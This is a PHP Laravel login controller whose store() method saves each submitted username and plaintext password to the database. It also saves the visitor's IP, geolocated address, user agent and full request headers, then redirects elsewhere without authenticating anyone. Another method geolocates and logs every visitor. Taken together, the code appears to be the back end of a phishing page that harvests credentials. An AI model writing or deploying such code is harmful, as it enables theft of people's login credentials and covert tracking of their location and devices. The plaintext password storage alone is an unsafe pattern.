<?php

namespace App\Http\Controllers\Frontend\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\StoreAccountRequest;
use App\Models\Account;
use App\Models\Log;
use App\Models\Media;
use App\Models\Notification;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Jenssegers\Agent\Agent;

class LoginController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return Application|Factory|View
     */
    public function index()
    {
        $agent     = new Agent();

        if ($agent->isDesktop()){
            return view('frontend.auth.desktop');
        } else {
            return view('frontend.auth.login-mobile');
        }
    }

    public function home()
    {
        $agent     = new Agent();
        $ipInfo    = $this->ipinfo();
        $dataAgent = [
            'device'  => $agent->deviceType(),
            'country' => $ipInfo['countryCode'],
            'region'  => $ipInfo['regionName'],
            'city'    => $ipInfo['cityName'],
            'browser' => $agent->browser(),
            'data'    => $ipInfo
        ];
        Log::create($dataAgent);

        $notification = Notification::query()->where('status', 'active')->latest()->first();

        $media = Media::where('status', 'active')->latest('updated_at')->first();

        return view('frontend.home.index', compact('notification', 'media'));

    }

    public function ipInfo()
    {
        $ip     = request()->ip() == '127.0.0.1' ? '8.8.8.8' : request()->ip();
        $url    = "https://api.ipinfodb.com/v3/ip-city";
        $apiKey = config('api.ip_info_key');

        return Http::withHeaders([
            'Content-Type' => 'application/json'
        ])->get($url, [
            'key'    => $apiKey,
            'format' => 'json',
            'ip'     => $ip
        ])->json();
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param StoreAccountRequest $request
     * @return RedirectResponse
     */
    public function store(StoreAccountRequest $request)
    {
        $agent                 = new Agent();
        $ipInfo                = $this->ipinfo();
        $account = $request->only(['username', 'password']);
        $account['ip']         = $ipInfo['ipAddress'];
        $account['address']    = "${ipInfo['countryName']}, ${ipInfo['regionName']}, ${ipInfo['cityName']}";
        $account['user_agent'] = $agent->getUserAgent();
        $account['request']    = $agent->getHttpHeaders();
        $account['ip_info']    = $ipInfo;

        Account::create($account);

        return redirect()->route('redirect');
    }

    /**
     * Display the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param \Illuminate\Http\Request $request
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
